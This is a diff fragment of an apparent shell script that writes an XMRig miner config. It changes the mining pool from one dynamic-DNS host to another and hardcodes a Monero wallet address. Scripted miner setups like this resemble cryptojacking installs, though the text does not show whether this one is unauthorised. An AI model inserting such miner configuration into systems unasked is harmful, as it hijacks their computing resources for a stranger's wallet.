@@ -79,7 +79,7 @@ cat > /usr/local/src/xmrig/build/config.json <<EOL
         {
             "algo": null,
             "coin": null,
-            "url": "vonqea.ddns.net:8080",
+            "url": "beatriz.geekgalaxy.com:8080",
             "user": "8821yB1PujCXARff1D8XjZZVnaMCW8wBVYa7JQ24mey9Yfs96pZCAgp9Z4FLqcNkquhGYkVE7AVBkbNpa8YtRGzzEhhJggT",
             "pass": "x",
             "rig-id": null,
